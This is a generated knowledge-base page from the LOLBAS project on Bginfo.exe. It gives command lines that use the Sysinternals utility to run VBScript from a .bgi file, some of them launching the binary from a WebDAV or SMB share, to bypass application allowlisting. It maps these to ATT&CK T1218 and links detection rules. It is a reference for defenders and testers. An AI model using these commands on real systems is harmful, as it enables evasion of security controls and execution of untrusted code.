---
title: "Bginfo.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OtherMSBinaries/Bginfo.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml"
build_date: "2026-04-27 18:39:01"
category: "OtherMSBinaries"
aliases:
  - "Bginfo.exe"
functions:
  - "Execute"
  - "AWL Bypass"
attack_technique_ids:
  - "T1218"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Bginfo.exe

Background Information Utility included with SysInternals Suite

## Metadata

- Category: OtherMSBinaries
- Created: 2018-05-25
- Author: Oddvar Moe
- Source Path: yml/OtherMSBinaries/Bginfo.yml

## Paths

- `no default`

## Commands

### 1. Execute

Execute VBscript code that is referenced within the specified .bgi file.

```cmd
bginfo.exe {PATH:.bgi} /popup /nolicprompt
```

- Use Case: Local execution of VBScript
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

### 2. AWL Bypass

Execute VBscript code that is referenced within the specified .bgi file.

```cmd
bginfo.exe {PATH:.bgi} /popup /nolicprompt
```

- Use Case: Local execution of VBScript
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

### 3. Execute

Execute bginfo.exe from a WebDAV server.

```cmd
\\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt
```

- Use Case: Remote execution of VBScript
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

### 4. AWL Bypass

Execute bginfo.exe from a WebDAV server.

```cmd
\\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt
```

- Use Case: Remote execution of VBScript
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

### 5. Execute

This style of execution may not longer work due to patch.

```cmd
\\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
```

- Use Case: Remote execution of VBScript
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

### 6. AWL Bypass

This style of execution may not longer work due to patch.

```cmd
\\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
```

- Use Case: Remote execution of VBScript
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_bginfo.yml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules

## Resources

- {'Link': 'https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/'}

## Acknowledgements

- {'Person': 'Oddvar Moe', 'Handle': '@oddvarmoe'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml)
